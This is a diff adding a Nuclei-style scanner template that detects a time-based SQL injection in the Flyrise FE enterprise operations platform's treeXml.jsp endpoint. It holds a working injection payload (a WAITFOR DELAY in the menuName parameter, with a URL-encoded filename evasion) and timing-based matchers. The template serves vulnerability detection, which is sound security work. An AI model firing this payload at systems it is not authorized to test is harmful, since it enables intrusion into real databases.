@@ -1,0 +1,29 @@
+id: flyrise-treeXml-sqli
+info:
+  name: 飞企互联 FE 企业运营管理平台 treeXml.js - sqli
+  author: leadlife
+  severity: high
+  description: 飞企互联-FE企业运营管理平台 treeXml.jsp 接口存在SQL注入漏洞，未经授权攻击者可通过该漏洞获取数据库敏感信息。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94-FE%E4%BC%81%E4%B8%9A%E8%BF%90%E8%90%A5%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0treeXml.jsp%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+  tags: 2024,sqli,flyrise,time
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        GET /sys/treeXml.js%70?menuName=1';WAITFOR+DELAY+'0:0:6'--&type=function HTTP/1.1 
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body,'没有权限访问')
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
